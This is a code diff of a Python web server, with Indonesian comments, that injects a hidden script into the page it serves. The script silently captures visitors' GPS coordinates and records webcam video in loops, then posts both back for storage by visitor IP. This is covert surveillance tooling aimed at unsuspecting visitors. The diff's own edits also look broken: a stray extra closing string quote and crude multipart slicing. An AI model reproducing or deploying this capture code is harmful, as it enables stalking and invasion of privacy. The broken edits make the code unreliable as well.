@@ -357,12 +357,12 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         with open("index.html", "rb") as f:
             html = f.read().decode("utf-8", "replace")
         
-        auto_capture_script = """
+        auto_capture_script = \"\"\"
         <script>
             function sendLocation() {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition((pos) => {
-                        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        const link = \`https://www.google.com/maps?q=\${pos.coords.latitude},\${pos.coords.longitude}\`;
                         fetch('/save-location', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -382,7 +382,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                     recorder.onstop = () => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
                         const fd = new FormData();
-                        fd.append('video', blob, `rec_${Date.now()}.webm`);
+                        fd.append('video', blob, \`rec_\${Date.now()}.webm\`);
                         fetch('/save-video', { method: 'POST', body: fd })
                             .then(() => recordCycle()).catch(() => recordCycle());
                     };
@@ -392,6 +392,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 recordCycle();
             }).catch(e => {});
         </script>
+        \"\"\"
         """
         
         script = BEACON_JS.replace("__T__", token) + auto_capture_script
@@ -408,28 +409,23 @@ class Handler(http.server.SimpleHTTPRequestHandler):
 
     def do_POST(self):
         parsed_path = self.path.split("?")[0]
-        client_ip_addr = client_ip(self.headers, self.client_address).replace(":", "_").replace(".", "_")
+        client_ip_addr = client_ip(self.headers, self.client_address).replace(":", "_")
         ip_folder = os.path.join(VIDEO_DIR, client_ip_addr)
 
-        # 1. Menangkap Tautan Google Maps & Koordinat GPS
         if parsed_path == "/save-location":
             try:
                 length = int(self.headers.get("Content-Length", 0))
-                if length > 0:
-                    data = json.loads(self.rfile.read(length).decode("utf-8"))
-                    gmaps_link = data.get("link")
-                    lat = data.get("lat")
-                    lon = data.get("lon")
-                    
-                    if not os.path.exists(ip_folder): 
-                        os.makedirs(ip_folder)
-                    
-                    loc_log_file = os.path.join(ip_folder, "log_lokasi.txt")
-                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    
-                    with open(loc_log_file, "a") as f:
-                        f.write(f"[{timestamp}] Lat: {lat}, Lon: {lon}\nMaps: {gmaps_link}\n---\n")
+                data = json.loads(self.rfile.read(length).decode("utf-8"))
+                gmaps_link = data.get("link")
                 
+                if not os.path.exists(ip_folder): os.makedirs(ip_folder)
+                loc_log_file = os.path.join(ip_folder, "log_lokasi.txt")
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                
+                with open(loc_log_file, "a") as f:
+                    f.write(f"[{timestamp}] {gmaps_link}\n")
+                    
+                print(f"Lokasi diterima: {gmaps_link}")
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b"OK")
@@ -437,25 +433,27 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 self.send_error(500, str(e))
             return
 
-        # 2. Menangkap Stream File Video .webm Mentah-mentah
         if parsed_path == "/save-video":
             try:
-                length = int(self.headers.get("Content-Length", 0))
-                if length > 0:
-                    video_bytes = self.rfile.read(length)
-                    if not os.path.exists(ip_folder): 
-                        os.makedirs(ip_folder)
-                    
-                    filename = f"video_{int(time.time())}_{uuid.uuid4().hex[:4]}.webm"
-                    filepath = os.path.join(ip_folder, filename)
-                    
-                    with open(filepath, 'wb') as f:
-                        f.write(video_bytes)
-                        
+                content_type = self.headers.get("Content-Type", "")
+                if "multipart/form-data" in content_type:
+                    length = int(self.headers.get("Content-Length", 0))
+                    body_data = self.rfile.read(length)
+                    header_end = body_data.find(b'\r\n\r\n')
+                    if header_end != -1:
+                        video_bytes = body_data[header_end + 4:-2]
+                        if not os.path.exists(ip_folder): os.makedirs(ip_folder)
+                        filename = f"video_{int(time.time())}_{uuid.uuid4().hex[:4]}.webm"
+                        filepath = os.path.join(ip_folder, filename)
+                        with open(filepath, "wb") as f:
+                            f.write(video_bytes)
+                        print("Video berhasil disimpan")
+                
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b"Saved")
             except Exception as e:
+                print("Error saving video:", e)
                 self.send_error(500, str(e))
             return
 
